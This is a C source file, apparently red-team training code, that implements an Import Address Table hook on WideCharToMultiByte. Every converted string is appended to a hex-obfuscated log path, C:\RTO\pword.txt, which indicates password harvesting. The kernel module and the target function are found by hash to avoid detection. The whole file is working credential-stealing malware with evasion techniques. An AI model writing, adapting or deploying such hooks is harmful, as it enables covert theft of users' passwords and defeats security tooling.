#define UTILS_IMPLEMENTATION
#include "../c_utils/utils.h"

INT HookedWideCharToMultiByteIAT(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar)
{
    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    INT BytesWritten = UtilsWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUseDefaultChar);

    char cFilePath[] = {0x43, 0x3a, 0x5c, 0x52, 0x54, 0x4f, 0x5c, 0x70, 0x77, 0x6f, 0x72, 0x64, 0x2e, 0x74, 0x78, 0x74, 0};
    HANDLE hFile = UtilsCreateFile(cFilePath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        UtilsWriteFile(hFile, lpMultiByteStr, BytesWritten, NULL, NULL);
        UtilsCloseHandle(hFile);
    }

shutdown:
    return BytesWritten;
}

void HookIAT(void)
{
    ULONG size = 0;
    ULONG_PTR pBaseAddr = (ULONG_PTR)UtilsGetModuleHandleA(NULL);

    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)UtilsImageDirectoryEntryToDataEx((PVOID)pBaseAddr, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size, NULL);

    ULONG ulDLLIndex = 0;
    BOOL bDLLFound = FALSE;

    DWORD64 dwKernelHash = 0xbef5f1ec;
    for (ulDLLIndex = 0; ulDLLIndex < size; ++ulDLLIndex)
    {
        DWORD64 dwHash = UtilsStrHash(pBaseAddr + pImageImportDescriptor[ulDLLIndex].Name);

        if (dwKernelHash == dwHash)
        {
            bDLLFound = TRUE;
            break;
        }
    }

    if (!bDLLFound)
    {
        goto shutdown;
    }

    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();

    DWORD64 dwWideCharToMultiByte = 0x1d529e18e;
    INT(WINAPI * pWideCharToMultiByte)
    (UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar) = UtilsGetProcAddressByHash(hKernel, dwWideCharToMultiByte);

    PROC ulWideCharToMultiByte = (PROC)pWideCharToMultiByte;

    PIMAGE_THUNK_DATA pImageThunkData = (PIMAGE_THUNK_DATA)(pBaseAddr + pImageImportDescriptor[ulDLLIndex].FirstThunk);

    while (pImageThunkData->u1.Function)
    {
        PROC *ulFuncAddr = (PROC *)&pImageThunkData->u1.Function;
        if (*ulFuncAddr == ulWideCharToMultiByte)
        {
            DWORD dwOldProtect = 0;

            UtilsVirtualProtect((LPVOID)ulFuncAddr, 4096, PAGE_READWRITE, &dwOldProtect);
            *ulFuncAddr = (PROC)HookedWideCharToMultiByteIAT;

            UtilsVirtualProtect((LPVOID)ulFuncAddr, 4096, dwOldProtect, &dwOldProtect);
            return;
        }

        ++pImageThunkData;
    }

shutdown:
    return;
}

int main(void)
{
    HookIAT();

    return 0;
}